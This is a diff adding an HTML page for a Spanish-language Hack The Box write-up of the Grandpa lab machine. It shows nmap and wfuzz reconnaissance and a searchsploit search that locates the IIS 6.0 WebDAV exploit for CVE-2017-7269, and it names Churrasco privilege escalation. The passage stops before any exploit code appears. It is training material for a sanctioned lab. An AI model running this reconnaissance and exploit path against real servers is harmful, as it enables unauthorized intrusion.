@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Grandpa - Hack The Box · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/htb-writeup-grandpa/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Grandpa - Hack The Box">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/htb-writeup-grandpa/grandpa_logo.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-blocky/">
+          <span class="side-post-card-title">Blocky</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-bank/">
+          <span class="side-post-card-title">Bank</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Grandpa</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-artic/">
+          <span class="side-post-card-title">Arctic</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-optimum/">
+          <span class="side-post-card-title">Optimum</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">HackTheBox / Easy Machine</div>
+    
+    <h1>Grandpa - Hack The Box</h1>
+    <div class="post-meta">18 February 2023 · 12 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/htb-writeup-grandpa/grandpa_logo.png" alt="Grandpa - Hack The Box">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina fácil en la cual vamos a vulnerar el servicio HTTP del puerto 80 que está usando Microsoft IIS 6.0 WebDAV, usando un Exploit que nos conectara de forma remota a la máquina (CVE-2017-7269), de ahí podemos escalar privilegios a NT Authority System aprovechando que tenemos el privilegio SeImpersonatePrivilege, justamente usando Churrasco.exe (una variante de Juicy Potato para sistemas windows viejos) y utilizando un Payload.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>wfuzz</code></li><li><code>searchsploit</code></li><li><code>nc</code></li><li><code>python2</code></li><li><code>windows-exploit-suggester.py</code></li><li><code>msfvenom</code></li><li><code>impacket-smbserver</code></li><li><code>systeminfo</code></li><li><code>copy</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#Inv">Investigando Alguna Vulnerabilidad para el Servicio Microsoft IIS httpd 6.0</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Exploit">Probando Variante de Exploit: Microsoft IIS 6.0 - WebDAV &lsquo;ScStoragePathFromUrl&rsquo; Remote Buffer Overflow</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Windows">Enumeración de Máquina</a></li>
+        <li><a href="#Churro">Escalando Privilegios con Churrasco</a></li>
+        <li><a href="#Nota">Nota Final</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#Inv">Investigando Alguna Vulnerabilidad para el Servicio Microsoft IIS httpd 6.0</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Exploit">Probando Variante de Exploit: Microsoft IIS 6.0 - WebDAV &lsquo;ScStoragePathFromUrl&rsquo; Remote Buffer Overflow</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Windows">Enumeración de Máquina</a></li>
+        <li><a href="#Churro">Escalando Privilegios con Churrasco</a></li>
+        <li><a href="#Nota">Nota Final</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a lanzar un ping para ver si la máquina está conectada y en base al TTL veamos contra que SO nos enfrentamos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 10.10.10.14 
+</span></span><span style="display:flex;"><span>PING 10.10.10.14 <span style="color:#f92672">(</span>10.10.10.14<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.14: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">131</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.14: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">131</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.14: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">131</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.14: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">133</span> ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.10.10.14 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3003ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 130.537/131.209/132.502/0.760 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa Windows. Es momento de hacer los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.10.14 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-02-18 18:33 CST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 18:33
+</span></span><span style="display:flex;"><span>Scanning 10.10.10.14 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.10.14
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 18:33, 28.32s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.14
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.40s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2023-02-18 18:33:22 CST <span style="color:#66d9ef">for</span> 28s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 28.40 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">131087</span> <span style="color:#f92672">(</span>5.768MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">24</span> <span style="color:#f92672">(</span>1.056KB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Solamente hay un puerto abierto, el <strong>servicio HTTP</strong> lo que nos dice que tiene una página web abierta, aun así, veamos qué servicio corre.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -p80 10.10.10.14 -oN targeted                              
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-02-18 18:34 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.14
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 6.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| http-webdav-scan: 
+</span></span><span style="display:flex;"><span>|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+</span></span><span style="display:flex;"><span>|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+</span></span><span style="display:flex;"><span>|   Server Type: Microsoft-IIS/6.0
+</span></span><span style="display:flex;"><span>|   Server Date: Sun, <span style="color:#ae81ff">02</span> Apr <span style="color:#ae81ff">2023</span> 00:34:43 GMT
+</span></span><span style="display:flex;"><span>|_  WebDAV type: Unknown
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/6.0
+</span></span><span style="display:flex;"><span>|_http-title: Under Construction
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.05 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Esta usando un <strong>servicio Microsoft IIS httpd 6.0</strong>, ya nos hemos enfrentado a algo similar, pero en este caso no hay ningún <strong>servicio FTP</strong> que podamos usar para aprovecharnos de este servicio. Es momento de analizar la página web.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Primero entremos a la página web:</p>
+<p><img src="/assets/images/htb-writeup-grandpa/Captura1.png" alt=""></p>
+<p>No veo nada que nos pueda ayudar. Veamos lo que nos dice el <strong>Wappalizer</strong>.</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-grandpa/Captura2.png">
+</p>
+<p>Nada, no veo nada que nos ayude. Intentemos hacer <strong>Fuzzing</strong> para ver si puede encontrar algo, aunque lo dudo bastante.</p>
+<h3 id="Fuzz">Fuzzing</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hc<span style="color:#f92672">=</span>404,302 -t <span style="color:#ae81ff">200</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.14/FUZZ/   
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.10.10.14/FUZZ/
+</span></span><span style="display:flex;"><span>Total requests: 220560
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000014:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">39</span> L     <span style="color:#ae81ff">159</span> W      <span style="color:#ae81ff">1433</span> Ch     <span style="color:#e6db74">&#34;http://10.10.10.14//&#34;</span>                                                       
+</span></span><span style="display:flex;"><span>000000004:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">39</span> L     <span style="color:#ae81ff">159</span> W      <span style="color:#ae81ff">1433</span> Ch     <span style="color:#e6db74">&#34;#&#34;</span>                                                                          
+</span></span><span style="display:flex;"><span>000000013:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">39</span> L     <span style="color:#ae81ff">159</span> W      <span style="color:#ae81ff">1433</span> Ch     <span style="color:#e6db74">&#34;#&#34;</span>                                                                          
+</span></span><span style="display:flex;"><span>000000016:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">1</span> L      <span style="color:#ae81ff">15</span> W       <span style="color:#ae81ff">218</span> Ch      <span style="color:#e6db74">&#34;images&#34;</span>                                                                     
+</span></span><span style="display:flex;"><span>000000203:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">1</span> L      <span style="color:#ae81ff">15</span> W       <span style="color:#ae81ff">218</span> Ch      <span style="color:#e6db74">&#34;Images&#34;</span>                                                                     
+</span></span><span style="display:flex;"><span>000003673:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">1</span> L      <span style="color:#ae81ff">15</span> W       <span style="color:#ae81ff">218</span> Ch      <span style="color:#e6db74">&#34;IMAGES&#34;</span>                                                                     
+</span></span><span style="display:flex;"><span>000045240:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">39</span> L     <span style="color:#ae81ff">159</span> W      <span style="color:#ae81ff">1433</span> Ch     <span style="color:#e6db74">&#34;http://10.10.10.14//&#34;</span>                                                       
+</span></span><span style="display:flex;"><span>000069324:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">29</span> L     <span style="color:#ae81ff">188</span> W      <span style="color:#ae81ff">1529</span> Ch     <span style="color:#e6db74">&#34;_private&#34;</span>                                                                   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total time: 645.2624
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">220560</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">220541</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: 341.8143
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-c</em></td>
+					<td>Para ver el resultado en un formato colorido.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;hc</em></td>
+					<td>Para no mostrar un código de estado en los resultados.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+	</tbody>
+</table>
+<p>No pues nada, vamos directamente a buscar un Exploit para el servicio <strong>Microsoft IIS httpd 6.0</strong>.</p>
+<h3 id="Inv">Investigando Alguna Vulnerabilidad para el Servicio Microsoft IIS httpd 6.0</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit Microsoft IIS httpd 6.0
+</span></span><span style="display:flex;"><span>Exploits: No Results
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>Papers: No Results
+</span></span></code></pre></div><p>Igual, nada. Busquemos por internet, haber si encontramos una vulnerabilidad.</p>
+<p>Encontré el siguiente Exploit aunque menciona algo llamado <strong>WebDAV</strong>, vamos a investigarlo y luego analizamos el Exploit.</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Servicio WebDAV</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>WebDAV es un grupo de trabajo del Internet Engineering Task Force. El término significa &ldquo;Autoría y versionado distribuidos por Web&rdquo;, y se refiere al protocolo que el grupo definió. El objetivo de WebDAV es hacer de la World Wide Web un medio legible y editable, en línea con la visión original de Tim Berners-Lee.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Ok, ya sabemos que es, ahora veamos el Exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit Microsoft IIS 6.0 WebDAV
+</span></span><span style="display:flex;"><span>----------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                             |  Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Microsoft IIS 6.0 - WebDAV <span style="color:#e6db74">&#39;ScStoragePathFromUrl&#39;</span> Remote Buffer Overflow                                   | windows/remote/41738.py
+</span></span><span style="display:flex;"><span>Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                    | windows/remote/8765.php
+</span></span><span style="display:flex;"><span>Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                | windows/remote/8704.txt
+</span></span><span style="display:flex;"><span>Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                | windows/remote/8806.pl
+</span></span><span style="display:flex;"><span>Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass <span style="color:#f92672">(</span>Patch<span style="color:#f92672">)</span>                                            | windows/remote/8754.patch
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>Papers: No Results
+</span></span></code></pre></div><p>Hay varios, pero vamos a probar el que encontramos por internet que es el primero.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="Exploit">Probando Variante de Exploit: Microsoft IIS 6.0 - WebDAV &lsquo;ScStoragePathFromUrl&rsquo; Remote Buffer Overflow</h3>
+<p><strong>ADVERTENCIA</strong>:</p>
+<p>Este Exploit me jodio la máquina varias veces porque probe distintos Exploits para escalar privilegios, ten cuidado porque si tienes que salirte forzosamente usando <strong>crtl + c</strong> desde dentro de la máquina, tendrás que reiniciarla desde <strong>HackTheBox</strong>, o al menos eso me paso a mi porque el <strong>servicio HTTP</strong> del puerto 80 dejo de funcionar.</p>
+<hr>
+<p>Vamos a copiarnos el Exploit en nuestra estación de trabajo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -x windows/remote/41738.py  
+</span></span><span style="display:flex;"><span>  Exploit: Microsoft IIS 6.0 - WebDAV <span style="color:#e6db74">&#39;ScStoragePathFromUrl&#39;</span> Remote Buffer Overflow
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/41738
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/windows/remote/41738.py
+</span></span><span style="display:flex;"><span>    Codes: CVE-2017-7269
